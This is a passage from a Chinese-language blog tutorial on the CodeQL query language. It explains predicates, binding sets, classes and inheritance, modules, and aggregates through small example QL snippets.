class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int isSmall(int i)&#123;</span><br><span class="line">    i in [1..9] and</span><br><span class="line">    result &#x3D; i +1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from int i</span><br><span class="line">select isSmall(i)</span><br></pre></td></tr></table></figure><p>如果i是[1~9]的整数，返回2～10。</p><p>对于这个下面这个例子，穷举3个case来返回不同的谓词结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">predicate hasCapital(string country, string capital) &#123;</span><br><span class="line">  country &#x3D; &quot;Belgium&quot; and capital &#x3D; &quot;Brussels&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; &quot;Germany&quot; and capital &#x3D; &quot;Berlin&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; &quot;France&quot; and capital &#x3D; &quot;Paris&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递归谓词"><a href="#递归谓词" class="headerlink" title="递归谓词"></a>递归谓词</h3><p>QL 中的谓词可以是<strong>递归的</strong>。这意味着它直接或间接地取决于自身。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">string getANeighbor(string country) &#123;</span><br><span class="line">  country &#x3D; &quot;France&quot; and result &#x3D; &quot;Belgium&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; &quot;France&quot; and result &#x3D; &quot;Germany&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; &quot;Germany&quot; and result &#x3D; &quot;Austria&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; &quot;Germany&quot; and result &#x3D; &quot;Belgium&quot;</span><br><span class="line">  or</span><br><span class="line">  country &#x3D; getANeighbor(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from string s</span><br><span class="line">where s &#x3D; &quot;Belgium&quot;</span><br><span class="line">select getANeighbor(s)</span><br></pre></td></tr></table></figure><p>这种case下，返回“Belgium”的全部邻居：“France” &amp; “Germany“</p><h3 id="谓词的种类"><a href="#谓词的种类" class="headerlink" title="谓词的种类"></a>谓词的种类</h3><p>三种</p><ul><li>非成员谓词Non-member predicate ： class外定义的谓词，不属于任何class</li><li>成员谓词：class内定义的常规谓词</li><li>特征谓词：简单粗暴，<strong>构造函数</strong>级别的谓词，直接规定</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int getSuccessor(int i) &#123;  &#x2F;&#x2F; 非成员谓词 non-member predicate</span><br><span class="line">  result &#x3D; i + 1 and</span><br><span class="line">  i in [1 .. 9]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FavoriteNumbers extends int &#123;</span><br><span class="line">  FavoriteNumbers() &#123;  &#x2F;&#x2F; 特征谓词 Characteristic predicates</span><br><span class="line">    this &#x3D; 1 or</span><br><span class="line">    this &#x3D; 4 or</span><br><span class="line">    this &#x3D; 9</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string getName() &#123;   &#x2F;&#x2F; 成员谓词 Member predicate</span><br><span class="line">    this &#x3D; 1 and result &#x3D; &quot;one&quot;</span><br><span class="line">    or</span><br><span class="line">    this &#x3D; 4 and result &#x3D; &quot;four&quot;</span><br><span class="line">    or</span><br><span class="line">    this &#x3D; 9 and result &#x3D; &quot;nine&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="行为绑定"><a href="#行为绑定" class="headerlink" title="行为绑定"></a>行为绑定</h3><p>绑定的意思是谓词的参数/结果一定是finite的，一定是有限的。</p><p>两个反例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int multiplyBy4(int i) &#123;</span><br><span class="line">  result &#x3D; i * 4</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate shortString(string str) &#123;</span><br><span class="line">  str.length() &lt; 10</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="绑定集合-bindingset"><a href="#绑定集合-bindingset" class="headerlink" title="绑定集合 bindingset[]"></a>绑定集合 bindingset[]</h3><p>如何使用非绑定谓词呢？加个bindingset限制就好了。(很像注解)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bindingset[i]</span><br><span class="line">int multiplyBy4(int i) &#123;</span><br><span class="line">    result &#x3D; i * 4</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from int i</span><br><span class="line">where i in [1..10]</span><br><span class="line">select multiplyBy4(i)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bindingset[x] bindingset[y]</span><br><span class="line">predicate plusOne(int x, int y) &#123;</span><br><span class="line">    x+1&#x3D;y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from int x, int y</span><br><span class="line">where y &#x3D; 42 and plusOne(x,y)</span><br><span class="line">select x,y</span><br></pre></td></tr></table></figure><p>区别：</p><ul><li><code>bindingset[x] bindingset[y]</code> 表示x, y至少有一个是有界的</li><li><code>bindingset[x,y]</code> 表示x,y 必须都是有界的</li></ul><h3 id="数据库谓词"><a href="#数据库谓词" class="headerlink" title="数据库谓词"></a>数据库谓词</h3><p>如果一个数据库内部包含Person表，我们可以用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">persons(x, firstName, _, age) &#x2F;&#x2F;第三个_表示Don‘t care expressioon 表示任意值都可以，不做限制</span><br></pre></td></tr></table></figure><p>唯一注意的是不可以自定义数据库谓词，一切要按照数据库提供的谓词去使用</p><h2 id="查询-Query"><a href="#查询-Query" class="headerlink" title="查询 Query"></a>查询 Query</h2><p>查询是 QL 程序的输出。</p><h3 id="select子句"><a href="#select子句" class="headerlink" title="select子句"></a>select子句</h3><p>正常模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from &#x2F;* ... variable declarations ... *&#x2F;</span><br><span class="line">where &#x2F;* ... logical formula ... *&#x2F;</span><br><span class="line">select &#x2F;* ... expressions ... *&#x2F;</span><br></pre></td></tr></table></figure><p>from/select是可选的</p><p>select子句中除了表达式之外，还可以加：</p><ul><li><code>as</code>      as后面加label，相当于给查询结果某一列加了label，后续可以继续使用该label</li><li><code>order by</code> 排序 ; <code>order by x asc</code> 升序；<code>order by y desc</code> 降序；</li></ul><p>举例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from int x, int y</span><br><span class="line">where x &#x3D; 3 and y in [0 .. 2]</span><br><span class="line">select x, y, x * y as product, &quot;product: &quot; + product</span><br></pre></td></tr></table></figure><p>按照y的降序排列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from int x, int y</span><br><span class="line">where x &#x3D; 3 and y in [0 .. 2]</span><br><span class="line">select x, y, x * y as product order by y desc</span><br></pre></td></tr></table></figure><h3 id="查询谓词"><a href="#查询谓词" class="headerlink" title="查询谓词"></a>查询谓词</h3><p>查询谓词是带有<code>query</code>注释的非成员谓词。</p><p>举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">query int getProduct(int x, int y)&#123;</span><br><span class="line">x &#x3D; 3 and</span><br><span class="line">y in [0..2] and</span><br><span class="line">result &#x3D; x * y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接执行就行，不用写select，或者硬要写的话，用<code>select getProduct(_,_)</code></p><p>优点：</p><p>我们可以在其他的谓词内部使用这种查询谓词：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class MultipleOfThree extends int &#123;</span><br><span class="line">MultipleOfThree()&#123; this &#x3D; getProduct(_,_)&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类型-Type"><a href="#类型-Type" class="headerlink" title="类型 Type"></a>类型 Type</h2><p>QL是一门静态类型语言，所以每一个变量都是拥有自己的声明类型的。</p><p>一个type是一组value；比如说，int是整数集合，代表所有的整数；</p><p>需要注意的是，一种value可以属于多个集合，也就是属于多种type。</p><p>Type有五种：数据库类型、class类型、字符类型、类域（class domain）类型</p><h3 id="原始类型-primitive-types"><a href="#原始类型-primitive-types" class="headerlink" title="原始类型 primitive types"></a>原始类型 primitive types</h3><p>原始类型属于QL内置，应用于全局namespace的一种类型。</p><ul><li>boolean：true or false</li><li>float：64位浮点数</li><li>int：32位整数</li><li>string：字符串</li><li>date：日期</li></ul><p>QL为这些原始类型提供了很多<a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#built-ins" target="_blank" rel="noopener">build-in方法</a>。</p><p>可以通过在适当类型的表达式上使用 dispatch 来获得恰当的方法。</p><h3 id="类Classes"><a href="#类Classes" class="headerlink" title="类Classes"></a>类Classes</h3><p>用户可以制定自己的type，可直接定义一个类。</p><p>类存在的目的：</p><ol><li>将一些相关的value聚合到一起，使他们成为成员</li><li>为这些成员创建成员谓词</li><li>定义子类覆盖成员谓词，继承所有父类谓词</li></ol><p>QL 中的类不会“创建”一个新对象，它只是表示一个逻辑属性。如果某值满足特定的逻辑属性，则该值在这个特定类中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class OneTwoThree extends int &#123;</span><br><span class="line">  OneTwoThree() &#123; &#x2F;&#x2F; characteristic predicate</span><br><span class="line">    this &#x3D; 1 or this &#x3D; 2 or this &#x3D; 3</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string getAString() &#123; &#x2F;&#x2F; member predicate</span><br><span class="line">    result &#x3D; &quot;One, two or three: &quot; + this.toString()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate isEven() &#123; &#x2F;&#x2F; member predicate</span><br><span class="line">    this &#x3D; 2</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>QL中自定义的类一定要至少extends一个父类，被extends的父类被称为base types</li><li>QL中的类允许多继承</li><li>不得extends final类</li></ol><h4 id="类内成分"><a href="#类内成分" class="headerlink" title="类内成分"></a>类内成分</h4><ul><li>特征谓词 （也就是“构造函数”</li><li>field声明</li><li>成员谓词</li><li>继承自父类的所有非私有成员谓词和字段，可以在本类中override</li></ul><h5 id="特征谓词Characteristic-predicate"><a href="#特征谓词Characteristic-predicate" class="headerlink" title="特征谓词Characteristic predicate"></a>特征谓词Characteristic predicate</h5><p>使用<code>this</code>关键字来对类中可能的逻辑属性进行限制</p><h5 id="成员谓词Member-predicate"><a href="#成员谓词Member-predicate" class="headerlink" title="成员谓词Member predicate"></a>成员谓词Member predicate</h5><p>可以通过“对象”调用，也可以使用<code>(类名).func()</code>强制进行cast调用</p><h5 id="字段Field"><a href="#字段Field" class="headerlink" title="字段Field"></a>字段Field</h5><p>成员属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class SmallInt extends int &#123;</span><br><span class="line">  SmallInt() &#123; this &#x3D; [1 .. 10] &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DivisibleInt extends SmallInt &#123;</span><br><span class="line">  SmallInt divisor;   &#x2F;&#x2F; declaration of the field &#96;divisor&#96;</span><br><span class="line">  DivisibleInt() &#123; this % divisor &#x3D; 0 &#125;</span><br><span class="line"></span><br><span class="line">  SmallInt getADivisor() &#123; result &#x3D; divisor &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DivisibleInt i</span><br><span class="line">select i, i.getADivisor()</span><br></pre></td></tr></table></figure><p>SmallInt类表示的是[1..10]之间的整数，DivisibleInt继承了SmallInt，结果就是每个数字的因数分解</p><h4 id="具体类Concrete-classes"><a href="#具体类Concrete-classes" class="headerlink" title="具体类Concrete classes"></a>具体类Concrete classes</h4><p>上面提到全部是具体类，拥有实际成分。</p><h4 id="抽象类Abstract-classes"><a href="#抽象类Abstract-classes" class="headerlink" title="抽象类Abstract classes"></a>抽象类Abstract classes</h4><p>使用<code>abstract</code>修饰的类</p><p>例子：</p><p>假设你对所有可以解释为 SQL 查询的表达式感兴趣，可以自己加一层抽象类。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abstract class SqlExpr extends Expr &#123;</span><br><span class="line"> ... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就可以为每一种数据库类型定义各种之类<code>class PostgresSqlExpr extends SqlExpr</code></p><h4 id="Override-成员谓词"><a href="#Override-成员谓词" class="headerlink" title="Override 成员谓词"></a>Override 成员谓词</h4><p>在谓词前面，添加override注释就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class OneTwo extends OneTwoThree &#123;</span><br><span class="line">  OneTwo() &#123;</span><br><span class="line">    this &#x3D; 1 or this &#x3D; 2</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override string getAString() &#123;</span><br><span class="line">    result &#x3D; &quot;One or two: &quot; + this.toString()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1,2会按照OneTwo来走，3会按照老方法来走，因为逻辑限制不一样。</p><h4 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h4><p>一个类可以继承多种type。在这种情况下，它继承自所有这些类型。</p><p>比如说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class Two extends OneTwo, TwoThree &#123;&#125;</span><br></pre></td></tr></table></figure><p><code>Two</code>必须满足逻辑属性<code>OneTwo</code>， 和<code>TwoThree</code>。这里的类<code>Two</code>包含一个值，2。</p><p>它还（间接）继承自<code>OneTwoThree</code>和<code>int</code>。</p><h4 id="非继承子类型Non-extending-subtypes"><a href="#非继承子类型Non-extending-subtypes" class="headerlink" title="非继承子类型Non-extending subtypes"></a>非继承子类型Non-extending subtypes</h4><p>一个类可以声明与其他类型的<code>instanceof</code>关系</p><p>class A instanceof B </p><p>并不是代表B是A的父类</p><blockquote><p>官方说法是:</p><p>class A extends B：B称为base type</p><p>class C instance of D：D称为supertypes</p><p>子类并不会继承supertype的任何成员谓词</p></blockquote><p>下面这个例子中，Bar类可以使用super的关键字调用Foo类中的foo_method()方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Foo extends int &#123;</span><br><span class="line">  Foo() &#123; this in [1 .. 10] &#125;</span><br><span class="line"></span><br><span class="line">  string foo_method() &#123; result &#x3D; &quot;foo&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Bar instanceof Foo &#123;</span><br><span class="line">  string toString() &#123; result &#x3D; super.foo_method() &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，Foo的特征谓词也适用于Bar。然而，foo_method在Bar中没有暴露，所以查询select any(Bar b).foo_method()的结果是编译时出错。从这个例子中可以看出，仍然可以用super关键字访问instanceof supertypes的方法。</p><p>intanceof的类其实并不属于子类的一部分，不参与子类，不可以override。</p><p>下面这个例子中，方法Bar::foo不是重写Foo::foo。相反，它只是重写Interface::foo。这意味着select any(Foo f).foo()只返回foo。</p><p>如果Bar被定义为extends Foo，那么select any(Foo b)将产生bar。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> class Interface extends int &#123;</span><br><span class="line">   Interface() &#123; this in [1 .. 10] &#125;</span><br><span class="line">   string foo() &#123; result &#x3D; &quot;&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> class Foo extends int &#123;</span><br><span class="line">   Foo() &#123; this in [1 .. 5] &#125;</span><br><span class="line">   string foo() &#123; result &#x3D; &quot;foo&quot; &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> class Bar extends Interface instanceof Foo &#123;</span><br><span class="line">   override string foo() &#123; result &#x3D; &quot;bar&quot; &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="模块-Module"><a href="#模块-Module" class="headerlink" title="模块 Module"></a>模块 Module</h2><p>模块提供了一种通过将相关类型、谓词和其他模块组合在一起来组织 QL 代码的方法。</p><p>可以将模块导入到其他文件中，这样可以避免重复，并有助于将您的代码组织成更易于管理的部分。</p><h3 id="定义一个模块"><a href="#定义一个模块" class="headerlink" title="定义一个模块"></a>定义一个模块</h3><p>here is an example of the simplest way，显示模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">module Example &#123;</span><br><span class="line">  class OneTwoThree extends int &#123;</span><br><span class="line">    OneTwoThree() &#123;</span><br><span class="line">      this &#x3D; 1 or this &#x3D; 2 or this &#x3D; 3</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只可以对显示模块加注解，不能注解文件模块</p><h3 id="模块种类"><a href="#模块种类" class="headerlink" title="模块种类"></a>模块种类</h3><h4 id="文件模块"><a href="#文件模块" class="headerlink" title="文件模块"></a>文件模块</h4><p>每个查询文件<code>.ql</code>和库文件<code>.qll</code>都属于是文件模块，模块名称就是文件名（文件名中的空格被替换为_）。</p><p>文件的内容构成了模块的主题。</p><h5 id="库模块"><a href="#库模块" class="headerlink" title="库模块"></a>库模块</h5><p>每个<code>.qll</code>文件都是一个库模块，库模块是一种文件模块。</p><p><strong>OneTwoThreeLib.qll</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class OneTwoThree extends int &#123;</span><br><span class="line">  OneTwoThree() &#123;</span><br><span class="line">    this &#x3D; 1 or this &#x3D; 2 or this &#x3D; 3</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="查询模块"><a href="#查询模块" class="headerlink" title="查询模块"></a>查询模块</h5><p>每个<code>.ql</code>文件都是一个查询模块。查询模块是一种文件模块。</p><ul><li><p>查询模块不可以被import。</p></li><li><p>查询模块一定要至少有一次查询，select或者query predicate都行</p></li></ul><p><strong>OneTwoQuery.ql</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import OneTwoThreeLib</span><br><span class="line"></span><br><span class="line">from OneTwoThree ott</span><br><span class="line">where ott &#x3D; 1 or ott &#x3D; 2</span><br><span class="line">select ott</span><br></pre></td></tr></table></figure><h4 id="显示模块"><a href="#显示模块" class="headerlink" title="显示模块"></a>显示模块</h4><p>可以在模块中定义一个模块。</p><p>我们可以在上面的<strong>OneTwoThreeLib.qll</strong>文件中定义一个模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">module M &#123;</span><br><span class="line">  class OneTwo extends OneTwoThree &#123;</span><br><span class="line">    OneTwo() &#123;</span><br><span class="line">      this &#x3D; 1 or this &#x3D; 2</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模块体"><a href="#模块体" class="headerlink" title="模块体"></a>模块体</h3><p>模块中可以包含以下结构：</p><ol><li>import 语句</li><li>predicates</li><li>types 包括用户定义的class</li><li>alias 别名</li><li>显示模块</li><li>select语句 仅在<a href="https://codeql.github.com/docs/ql-language-reference/modules/#query-modules" target="_blank" rel="noopener">查询模块中</a>可用</li></ol><h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><p>当导入一个模块时，会将其命名空间中的所有名称（<a href="https://codeql.github.com/docs/ql-language-reference/annotations/#private" target="_blank" rel="noopener">私有</a>名称除外）带入当前模块的<a href="https://codeql.github.com/docs/ql-language-reference/name-resolution/#namespaces" target="_blank" rel="noopener">命名空间</a>中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import &lt;module_expression1&gt; as &lt;name&gt;</span><br><span class="line">import &lt;module_expression2&gt;</span><br></pre></td></tr></table></figure><p>可以起别名 用as关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import javascript as js</span><br></pre></td></tr></table></figure><h2 id="别名-Alias"><a href="#别名-Alias" class="headerlink" title="别名 Alias"></a>别名 Alias</h2><p>QL 实体的替代名称。</p><h2 id="变量-Variable"><a href="#变量-Variable" class="headerlink" title="变量 Variable"></a>变量 Variable</h2><p>QL 中变量的使用方式与代数或逻辑中的变量类似。变量代表一组值，这些值通常受公式限制。</p><h3 id="声明一个变量"><a href="#声明一个变量" class="headerlink" title="声明一个变量"></a>声明一个变量</h3><p>type+name</p><p>Free variable &amp; bound variable</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;hello&quot;.indexOf(&quot;l&quot;) &#x2F;&#x2F; 2 and 3</span><br><span class="line"></span><br><span class="line">min(float f | f in [-3 .. 3]) &#x2F;&#x2F; bound</span><br><span class="line"></span><br><span class="line">(i + 7) * 3 &#x2F;&#x2F; free</span><br><span class="line"></span><br><span class="line">x.sqrt() &#x2F;&#x2F; free</span><br></pre></td></tr></table></figure><h2 id="表达式-Expression"><a href="#表达式-Expression" class="headerlink" title="表达式 Expression"></a>表达式 Expression</h2><p>表达式计算一组值并具有类型。</p><p>表达式的种类：</p><ul><li>module expression</li><li>type expression</li><li>predicate expression</li></ul><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><ul><li>Boolean ： true false</li><li>Integer：整数（正，负）</li><li>Float：浮点数（正，负）</li><li>String：字符串</li></ul><p>The following string formats are recognized as dates:</p><ul><li><strong>ISO dates</strong>, such as <code>&quot;2016-04-03 17:00:24&quot;</code>. The seconds part is optional (assumed to be <code>&quot;00&quot;</code> if it’s missing), and the entire time part can also be missing (in which case it’s assumed to be <code>&quot;00:00:00&quot;</code>).</li><li><strong>Short-hand ISO dates</strong>, such as <code>&quot;20160403&quot;</code>.</li><li><strong>UK-style dates</strong>, such as <code>&quot;03/04/2016&quot;</code>.</li><li><strong>Verbose dates</strong>, such as <code>&quot;03 April 2016&quot;</code>.</li></ul><h3 id="范围Range"><a href="#范围Range" class="headerlink" title="范围Range"></a>范围Range</h3><p>[3..7] 表示 3，4，5，6，7</p><p>自定义set：</p><p>前十个素数：[2, 3, 5, 7, 11, 13, 17, 19, 23, 29]</p><h3 id="Super"><a href="#Super" class="headerlink" title="Super"></a>Super</h3><p>和Java中的super一样，用来调用super types中的同名方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class A extends int &#123;</span><br><span class="line">  A() &#123; this &#x3D; 1 &#125;</span><br><span class="line">  int getANumber() &#123; result &#x3D; 2 &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B extends int &#123;</span><br><span class="line">  B() &#123; this &#x3D; 1 &#125;</span><br><span class="line">  int getANumber() &#123; result &#x3D; 3 &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C extends A, B &#123;</span><br><span class="line">  &#x2F;&#x2F; Need to define &#96;int getANumber()&#96;; otherwise it would be ambiguous</span><br><span class="line">  int getANumber() &#123;</span><br><span class="line">    result &#x3D; B.super.getANumber()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from C c</span><br><span class="line">select c, c.getANumber()</span><br></pre></td></tr></table></figure><h3 id="调用谓词-with-result"><a href="#调用谓词-with-result" class="headerlink" title="调用谓词 with result"></a>调用谓词 with result</h3><p>调用有返回值的谓词本身就是表达式 <code>a.getAChild()</code></p><p>调用没有返回值的谓词是公式formula</p><h3 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h3><p>聚合是一种映射，它根据公式指定的一组输入值计算结果值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;aggregate&gt;(&lt;variable declarations&gt; | &lt;formula&gt; | &lt;expression&gt;)</span><br></pre></td></tr></table></figure><p>fromula加以限制，expression计算结果值，aggregate算出来想要的目标</p><p>关键词：</p><p>排序关键词：<strong>min</strong>，<strong>max</strong>，<strong>rank</strong>，<strong>concat</strong>，<strong>strictconcat</strong></p><p>排序是可以自动选择按照数值排序，还是按照字符排序(unicode value)。</p><p>特殊需求排序：<code>order by &lt;element&gt; [desc/asc]</code> 缺省是asc升序排列</p><p>比如：<code>order by o.getName()</code></p><p>charAt() 返回值是去重的</p><p>一些例子：</p><ol><li><p><strong>count</strong>：确定<code>&lt;expression&gt;</code>不同结果的个数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count(File f | f.getTotalNumberOfLines() &gt; 500 | f) &#x2F;&#x2F; 寻找文件行数大于500行的文件数</span><br></pre></td></tr></table></figure></li><li><p><strong>min</strong>，<strong>max</strong>：<code>&lt;expression&gt;</code>的最小、最大值 